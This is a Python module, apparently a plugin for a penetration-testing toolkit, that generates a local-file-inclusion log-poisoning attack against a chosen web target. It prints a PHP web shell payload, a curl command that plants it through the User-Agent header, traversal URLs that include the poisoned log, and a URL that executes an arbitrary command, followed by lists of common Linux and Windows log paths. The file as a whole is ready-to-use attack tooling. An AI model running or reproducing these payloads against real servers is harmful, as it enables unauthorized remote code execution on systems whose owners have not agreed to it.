import urllib.parse

from core.target import get_current_url

PROVIDES = []
REQUIRES = []

# =========================================================
# COLORS
# =========================================================

G = '\033[92m'
C = '\033[96m'
B = '\033[94m'
Y = '\033[93m'
R = '\033[91m'
W = '\033[0m'
BOLD = '\033[1m'

# =========================================================
# LOG PATHS
# =========================================================

LOGS = {
    "1": (
        "Apache access.log",
        "/var/log/apache2/access.log",
    ),
    "2": (
        "Apache error.log",
        "/var/log/apache2/error.log",
    ),
    "3": (
        "Nginx access.log",
        "/var/log/nginx/access.log",
    ),
    "4": (
        "Nginx error.log",
        "/var/log/nginx/error.log",
    ),
    "5": (
        "/proc/self/environ",
        "/proc/self/environ",
    ),
    "6": (
        "Custom",
        None,
    ),
}

# =========================================================
# MAIN
# =========================================================

def run(data, cred, args):

    ip = get_current_url(data)

    if not ip:

        print(
            f"\n{R}[!] No target selected.{W}\n"
        )

        return

    url = input(
        f"{Y}Base URL [{ip}]> {W}"
    ).strip() or ip

    parameter = input(
        f"{Y}LFI Parameter [language]> {W}"
    ).strip() or "language"

    traversal = input(
        f"{Y}Traversal Prefix [../../../../]> {W}"
    ).strip() or "../../../../"

    print()

    for k, v in LOGS.items():

        print(
            f"  {B}[{C}{k}{B}]{W} {v[0]}"
        )

    print()

    choice = input(
        f"{Y}Log File> {W}"
    ).strip()

    if choice == "6":

        logfile = input(
            f"{Y}Path> {W}"
        ).strip()

    elif choice in LOGS:

        logfile = LOGS[choice][1]

    else:

        print(
            f"\n{R}[!] Invalid selection.{W}\n"
        )

        return

    command = input(
        f"{Y}Command [id]> {W}"
    ).strip() or "id"

    shell = '<?php system($_GET["cmd"]); ?>'

    encoded = urllib.parse.quote(shell)

    print()

    print(
        f"{B}┌── {BOLD}LOG POISONING{W}{B} ─────────────────────┐{W}"
    )

    print(
        f"{B}└────────────────────────────────────────────┘{W}\n"
    )

    print(
        f"{G}[+] Poison Request (Browser){W}\n"
    )

    print(
        f"{url}?{parameter}={encoded}"
    )

    print()

    print(
        f"{G}[+] Poison Request (curl){W}\n"
    )

    print(
        f"""curl -H 'User-Agent: <?php system($_GET["cmd"]); ?>' "{url}" """
    )

    print()

    print(
        f"{G}[+] Include Log{W}\n"
    )

    print(
        f"{url}?{parameter}={traversal}{logfile}"
    )

    print()

    print(
        f"{G}[+] Execute Command{W}\n"
    )

    print(
        f"{url}?{parameter}={traversal}{logfile}&cmd={command}"
    )

    print()

    print(
        f"{G}[+] Common Log Files{W}\n"
    )

    print(
        "  Linux"
    )

    print(
        "    /var/log/apache2/access.log"
    )

    print(
        "    /var/log/apache2/error.log"
    )

    print(
        "    /var/log/nginx/access.log"
    )

    print(
        "    /var/log/nginx/error.log"
    )

    print(
        "    /proc/self/environ"
    )

    print(
        "    /proc/self/fd/0"
    )

    print(
        "    /proc/self/fd/1"
    )

    print(
        "    /proc/self/fd/2"
    )

    print()

    print(
        "  Windows"
    )

    print(
        r"    C:\xampp\apache\logs\access.log"
    )

    print(
        r"    C:\xampp\apache\logs\error.log"
    )

    print(
        r"    C:\nginx\log\access.log"
    )

    print(
        r"    C:\nginx\log\error.log"
    )

    print()
